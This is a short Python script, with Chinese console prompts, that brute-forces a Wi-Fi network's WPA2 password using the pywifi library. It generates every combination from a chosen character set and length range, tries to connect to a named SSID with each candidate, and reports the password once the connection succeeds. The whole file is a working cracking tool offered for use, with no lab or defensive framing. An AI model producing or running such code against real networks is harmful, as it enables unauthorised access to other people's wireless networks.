# coding:utf-8
import time
import pywifi
from pywifi import const
import itertools as its


def yield_password(len, len_end, words=None):

    if words is None:
        words = '0123456789'
    for num in range(len, len_end):
        keys=its.product(words, repeat=num)
        for key in keys:
            yield ''.join(tuple(key))


class Get_Password_Jl():
    def __init__(self):

        get_wifi_interface = pywifi.PyWiFi()
        self.network_interface = get_wifi_interface.interfaces()[0]
        self.network_interface.disconnect()
        time.sleep(1)

    def get_password(self, passwords, name):
        print(name)
        print("破解开始ing...")

        for password in passwords:
            if not password:
                break
            test_connect_bool1 = self.password_connect_jl(password, name)
            if test_connect_bool1:
                print("密码正确:", end='')
                print(password)
                break
            else:
                print("密码错误:", end='')
                print(password)
            time.sleep(1)

    def password_connect_jl(self, password, name):

        wifi_profile_jl = pywifi.Profile()
        wifi_profile_jl.ssid = name   # "HUAWEI nova 3e"
        wifi_profile_jl.auth = const.AUTH_ALG_OPEN
        wifi_profile_jl.akm.append(const.AKM_TYPE_WPA2PSK)
        wifi_profile_jl.cipher = const.CIPHER_TYPE_CCMP
        wifi_profile_jl.key = password
        self.network_interface.remove_all_network_profiles()
        tmp_profile = self.network_interface.add_network_profile(wifi_profile_jl)
        self.network_interface.connect(tmp_profile)
        time.sleep(3)
        if self.network_interface.status() == const.IFACE_CONNECTED:
            correct = True
        else:
            correct = False
        self.network_interface.disconnect()
        time.sleep(1)
        return correct

    """def __del__(self):
        self.password_direction_path.close()"""


if __name__ == '__main__':
    try:
        words = input("请输入密码包含的字符('0123456789') :")
        lens= input("请输入密码长度(i j):")   # 格式i j 严格
        name = input('please input WIFI name ("HUAWEI nova 3e") :')
    except Exception:
        print('请严格遵守输入格式！')
    len, len_end = lens.split(' ')
    if words == '':
        words = '0123456789'


      #
    if name == '':
        name = "HUAWEI nova 3e"

    start = Get_Password_Jl()
    #, str(words)
    start.get_password(yield_password(int(len), int(len_end), words), name)
